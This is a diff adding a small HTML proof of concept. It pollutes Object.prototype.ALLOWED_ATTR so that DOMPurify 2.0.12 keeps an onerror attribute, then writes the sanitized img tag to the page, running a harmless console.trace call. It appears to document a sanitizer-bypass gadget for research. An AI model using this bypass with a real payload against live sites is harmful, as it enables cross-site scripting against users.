@@ -1,0 +1,7 @@
+<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.12/purify.min.js"></script>
+<script>
+  Object.prototype.ALLOWED_ATTR = ['onerror', 'src']
+</script>
+<script>
+  document.write(DOMPurify.sanitize('<img src onerror=console.trace()>'))
+</script>
